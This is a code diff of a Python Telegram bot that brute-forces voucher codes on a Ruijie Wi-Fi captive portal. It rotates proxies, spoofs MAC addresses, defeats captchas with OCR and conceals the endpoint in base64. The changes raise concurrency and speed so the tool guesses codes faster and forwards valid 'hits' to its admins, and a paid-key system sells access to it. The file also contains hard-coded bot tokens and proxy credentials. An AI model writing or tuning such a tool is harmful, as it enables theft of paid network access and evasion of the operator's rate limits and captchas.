@@ -8,7 +8,7 @@ BOT_TOKEN = "8867816797:AAFXkNP8MJEIjAHZRsRAUDhAn_EgmeLYowg"
 FORWARD_BOT_TOKEN = "8666040280:AAF3qRvNtY_dPMRbzzrFo2uGWuYYDtNODwE"
 ADMINS = ["7366841341", "8728200516"]
 
-PROXY_LIST = ["kdobnvaq:4y2b5qje1mhd@31.59.20.176:6754"] * 30
+PROXY_LIST = ["kdobnvaq:4y2b5qje1mhd@31.59.20.176:6754"] * 50
 _proxy_index = 0
 def get_next_proxy():
     global _proxy_index
@@ -20,9 +20,8 @@ def get_next_proxy():
 bot = AsyncTeleBot(BOT_TOKEN)
 forward_bot = AsyncTeleBot(FORWARD_BOT_TOKEN)
 
-user_data, active_scans, scan_stats = {}, {}, {}
-VALID_KEYS = {} # Format: {key: expiry_timestamp}
-USER_KEYS = {}  # Format: {chat_id: {"key": key, "expiry": timestamp}}
+user_data, active_scans = {}, {}
+VALID_KEYS, USER_KEYS = {}, {}
 session, _connector = None, None
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
@@ -32,7 +31,7 @@ def is_admin(user_id):
 async def verify_hit(session_url, code):
     post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
     proxy = get_next_proxy()
-    timeout = aiohttp.ClientTimeout(total=15)
+    timeout = aiohttp.ClientTimeout(total=10)
     async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
         try:
             mac = ':'.join(f'{random.choice([2,6,10,14]):02x}' for _ in range(6))
@@ -61,18 +60,18 @@ async def verify_hit(session_url, code):
             pass
     return False
 
-async def perform_check(session_url, code, chat_id):
-    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
-    for _ in range(2):
+async def perform_check(session_url, code, chat_id, semaphore):
+    async with semaphore:
+        post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
         proxy = get_next_proxy()
-        timeout = aiohttp.ClientTimeout(total=20)
+        timeout = aiohttp.ClientTimeout(total=15)
         async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
             try:
                 mac = ':'.join(f'{random.choice([2,6,10,14]):02x}' for _ in range(6))
                 s_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
                 async with ts.get(s_url, headers={'user-agent': 'Mozilla/5.0'}, proxy=proxy) as req:
                     s_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
-                    if not s_id: continue
+                    if not s_id: return False
                     sessionId = s_id.group(1)
                 
                 async with ts.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}', proxy=proxy) as img_req:
@@ -89,7 +88,6 @@ async def perform_check(session_url, code, chat_id):
                 async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                     resp_text = await p_req.text()
                     if 'logonUrl' in resp_text:
-                        # Double check verification to prevent false positive
                         is_valid = await verify_hit(session_url, code)
                         if not is_valid: return False
 
@@ -99,17 +97,25 @@ async def perform_check(session_url, code, chat_id):
                             f"🎫 **Code:** `3000{code}`\n"
                             f"🔗 **Portal URL:**\n{session_url}"
                         )
+                        
+                        # User ထံသို့ ပေးပို့ရန်
                         await bot.send_message(chat_id, f"✅ **Success Code Hit!**\n\n🎫 Code: `3000{code}`")
+                        
+                        # Forward Bot မှတစ်ဆင့် Admin များအားလုံးထံသို့ ပေးပို့ရန်
+                        for admin_id in ADMINS:
+                            try:
+                                await forward_bot.send_message(admin_id, hit_msg, parse_mode="Markdown")
+                            except Exception:
+                                pass
                         try:
                             await forward_bot.send_message(ADMINS[0], hit_msg, parse_mode="Markdown")
                         except Exception:
                             pass
+                            
                         return True
-                    if 'request limited' not in resp_text:
-                        break
             except Exception:
                 pass
-    return False
+        return False
 
 async def web_server():
     app = web.Application()
@@ -167,7 +173,7 @@ async def callbacks(call):
             await bot.answer_callback_query(call.id, "🛑 Scan ရပ်လိုက်ပါပြီ။", show_alert=True)
             await bot.edit_message_text("🛑 Scanning successfully stopped.", chat_id, call.message.message_id, reply_markup=main_kb(is_adm))
         else:
-            await bot.answer_callback_query(call.id, "⚠️ လက်ရှိ Run နေသော Scan မရှိပါ၊", show_alert=True)
+            await bot.answer_callback_query(call.id, "⚠️ လက်ရှိ Run နေသော Scan မရှိပါ။", show_alert=True)
     elif call.data == "admin_panel" and is_adm:
         kb = InlineKeyboardMarkup(row_width=1)
         kb.add(InlineKeyboardButton("➕ Key အသစ်ထုတ်မည် (ရက်ပိုင်း)", callback_data="admin_gen_key_menu"),
@@ -229,12 +235,13 @@ async def run_scan_loop(mode, chat_id, session_url, msg_id):
     scanned_count = 0
     found_count = 0
     start_time = time.time()
+    semaphore = asyncio.Semaphore(100)
     
     while active_scans.get(chat_id, False):
         batch_tasks = []
-        for _ in range(10): # Concurrency speed boost
+        for _ in range(50):
             code = "".join(random.choices(chars, k=length))
-            batch_tasks.append(perform_check(session_url, code, chat_id))
+            batch_tasks.append(perform_check(session_url, code, chat_id, semaphore))
         
         results = await asyncio.gather(*batch_tasks)
         scanned_count += len(batch_tasks)
@@ -256,7 +263,7 @@ async def run_scan_loop(mode, chat_id, session_url, msg_id):
         except Exception:
             pass
         
-        await asyncio.sleep(0.05)
+        await asyncio.sleep(0.01)
 
 @bot.message_handler(commands=['key'])
 async def handle_key(m):
@@ -293,10 +300,9 @@ async def handle_portal(m):
 async def main():
     global session, _connector
     session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
-    _connector = aiohttp.TCPConnector(limit=3000, ssl=False)
+    _connector = aiohttp.TCPConnector(limit=5000, ssl=False)
     asyncio.create_task(web_server())
     await bot.infinity_polling()
 
 if __name__ == '__main__':
     asyncio.run(main())
-
